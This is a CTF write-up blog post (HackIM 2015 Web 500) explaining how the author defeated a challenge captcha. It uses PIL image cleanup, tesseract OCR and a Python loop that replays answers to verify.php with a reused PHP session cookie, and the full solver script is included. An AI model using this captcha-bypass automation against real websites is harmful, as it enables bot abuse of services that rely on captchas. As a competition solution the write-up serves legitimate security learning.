@@ -1,0 +1,236 @@
+---
+layout: post
+title: "HackIM 2015 Web 500"
+date: 2015-01-11 16:35:24 -0500
+author: [et0x]
+comments: true
+categories: [hackim]
+---
+
+### Solved by et0x
+
+The only hint you get for this challenge is `Break the Captcha!`, and upon visiting the page provided, you are present with the following page:
+
+![](/images/2015/hackim/web500/1.png)
+
+Web 500 wants you to break a captcha a set number of times within 120 seconds.  What makes this one really challenging is the usage of PHP Session IDs each time you load the page, so you have to compensate for this.  
+
+Looking at the source, you can see that the captcha image code is as follows:
+
+```html
+<img src="imagedemo.php" onerror=javascript:error();>
+```
+So if you load up "imagedemo.php", the captcha image alone is loaded.  Also, every time you reload this page, the captcha changes.  The other page involved in this challenge is "verify.php" (For your POST request form submission of the captcha code), as you can see in the source of the page.
+
+```html
+<img src="imagedemo.php" onerror=javascript:error();><br>  Enter Code:<input type="text" name="solution" />  <input type="submit" name="Submit" value="Submit" />
+```
+
+Therefore, the data in our POST requests to imagedemo.php will contain "solution=[captcha code]" and "Submit=Submit".
+
+First thing is first here, though.  Before we can do anything with the requests, we have to extract the text from the captcha image and save it in a readable format for OCR text translation.  A good article on how to make text more readable from images is available at http://www.boyter.org/decoding-captchas/ .  This was a great resource for me.  
+
+The code for the image translation is as follows:
+
+```python
+im = Image.open("captcha.png")
+im = im.convert("P")
+hist = im.histogram()
+
+values = {}
+
+for i in range(256):
+    values[i] = hist[i]
+
+
+im2 = Image.new("P",im.size,255)
+
+im = im.convert("P")
+
+temp = {}
+
+for x in range(im.size[1]):
+    for y in range(im.size[0]):
+        pix = im.getpixel((y,x))
+        temp[pix] = pix
+        if pix in range(191,255):
+            im2.putpixel((y,x),0)
+
+im2.save("output.png")
+im2 = im2.resize((400,100),Image.ANTIALIAS)
+im2.convert("RGB")
+im2.save("output2.png")
+```
+
+This code takes your captcha and converts it to 256 colors, so that you can easily work with it.  It then looks at all the pixels for colors that are within the "text" color range, and saves only these pixels onto a new image with black pixels on a white background.
+
+Before:
+![](/images/2015/hackim/web500/2.png)
+
+After:
+![](/images/2015/hackim/web500/3.png)
+
+Once that was done, I simply installed tesseract-ocr onto my linux box and threw that into a subprocess call, to store the results into text.
+
+```python
+subprocess.call("tesseract output2.png out -psm 8",shell=True)
+x = open("out.txt").read()
+print "==="
+x = x.replace("\n","")
+```
+
+Note that the tesseract command is not perfect as the font used in the captcha is non standard, but it is successful frequently enough for it to be effective for our purposes.
+
+
+Finally we had to structure a loop to operate in the following way, in order to get our flag:
+
+```
+1. GET @ imagedemo.php
+-store phpsessid cookie
+-save captcha image
+-convert captcha image
+
+LOOP:
+
+2. POST @ verify.php    (since server still has captcha stored from above request)
+-utilize phpsessid from above
+-solution = text converted captcha from above
+-Submit = Submit
+3. GET @ imagedemo.php
+-utilize phpsessid from above
+-save captcha image
+-convert captcha image
+4. Goto "LOOP"
+```
+
+The file also wrote the text from each post request out to a text file which I followed with "tail -f" until we were successful!
+
+After running the script, we get positive results, with our flag being:  
+`flag{H@CKIM_C@pTcha!09022015}`
+
+Here is the code I made to solve the problem, yes the code is ugly, but it works!:  
+(for those wondering why I didn't just put the first part in the loop, for some reason my captcha image wouldn't save to disk correctly if it was written that way)
+
+```python
+import subprocess
+import Image
+import requests
+import os
+
+url = "http://54.165.191.231/imagedemo.php"
+r = requests.get(url)
+sess = dict(PHPSESSID=r.cookies["PHPSESSID"])
+print sess
+#r = requests.get(url,cookies={"PHPSESSID":r.cookies["PHPSESSID"]})
+a = open("captcha.png","w")
+print "added captcha.png"
+a.write(requests.utils.get_unicode_from_response(r))
+a.close()
+
+
+
+
+im = Image.open("captcha.png")
+im = im.convert("P")
+hist = im.histogram()
+
+values = {}
+
+for i in range(256):
+    values[i] = hist[i]
+
+
+im2 = Image.new("P",im.size,255)
+
+im = im.convert("P")
+
+temp = {}
+
+for x in range(im.size[1]):
+    for y in range(im.size[0]):
+        pix = im.getpixel((y,x))
+        temp[pix] = pix
+        if pix in range(191,255):
+            im2.putpixel((y,x),0)
+
+im2.save("output.png")
+im2 = im2.resize((400,100),Image.ANTIALIAS)
+im2.convert("RGB")
+im2.save("output2.png")
+
+
+
+subprocess.call("tesseract output2.png out -psm 8",shell=True)
+x = open("out.txt").read()
+print "==="
+x = x.replace("\n","")#[::-1]
+print "Sending: %s"%x
+datas = {"solution":x.replace("\n",""),"Submit":"Submit"}
+r = requests.get("http://54.165.191.231/verify.php")
+headers = r.headers
+#print headers
+
+postdata = {"solution":x,"Submit":"Submit"}
+s = requests.session()
+url = "http://54.165.191.231/"
+r = s.post(url+"verify.php",data=postdata,cookies=sess)
+print r.content
+
+for xx in range(200):
+    url = "http://54.165.191.231/imagedemo.php"
+    r = requests.get(url,cookies=sess)
+
+    a = open("captcha.png","w")
+    print "added captcha.png"
+    a.write(requests.utils.get_unicode_from_response(r))
+    a.close()
+
+    im = Image.open("captcha.png")
+    im = im.convert("P")
+    hist = im.histogram()
+
+    values = {}
+
+    for i in range(256):
+        values[i] = hist[i]
+
+
+    im2 = Image.new("P",im.size,255)
+
+    im = im.convert("P")
+
+    temp = {}
+
+    for x in range(im.size[1]):
+        for y in range(im.size[0]):
+            pix = im.getpixel((y,x))
+            temp[pix] = pix
+            if pix in range(191,255):
+                im2.putpixel((y,x),0)
+
+    im2.save("output.png")
+    im2 = im2.resize((400,100),Image.ANTIALIAS)
+    im2.convert("RGB")
+    im2.save("output2.png")
+
+
+
+    subprocess.call("tesseract output2.png out -psm 8",shell=True)
+    x = open("out.txt").read()
+    print "==="
+    x = x.replace("\n","")#[::-1]
+    print "Sending: %s"%x
+    datas = {"solution":x.replace("\n",""),"Submit":"Submit"}
+    r = requests.get("http://54.165.191.231/verify.php")
+    headers = r.headers
+
+
+    postdata = {"solution":x,"Submit":"Submit"}
+    s = requests.session()
+    url = "http://54.165.191.231/"
+    r = s.post(url+"verify.php",data=postdata,cookies=sess)
+    print r.content
+    p = open("web500.txt","w")
+    p.write(r.content)
+    p.close()
+```
